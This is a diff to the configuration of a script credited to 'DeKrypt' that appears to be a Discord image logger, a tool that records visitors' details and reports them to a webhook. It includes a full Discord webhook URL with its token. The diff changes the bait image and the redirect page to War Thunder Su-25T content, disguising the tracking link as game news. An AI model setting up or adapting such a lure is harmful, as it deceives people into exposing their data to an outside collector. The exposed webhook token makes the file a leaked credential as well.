@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1126535020115411018/IJSjpnZC3e50T2msIzvh7PDCUC1NsC2yQX6YS-e2n3NoJDEHvtVt13yoJwMOVcIQ5GLp",
-    "image": "https://th.bing.com/th/id/OIP.b8U1fXL9b2ts3V_Wdk8HZAHaEK?pid=ImgDet&rs=1", # You can also have a custom image by using a URL argument
+    "image": "https://static.warthunder.com/upload/image/0_2023/5_May/Su25T/1280x720_01_su_25t_4a5b93376d70638a7157e52b6fb36ede.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "https://www.youtube.com/" # Link to the webpage to redirect to 
+        "page": "https://warthunder.com/fr/news/5094-d%C3%A9veloppement-su-25t-et-pr%C3%A9commande-du-su-39-la-riposte-de-sergey-fr" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
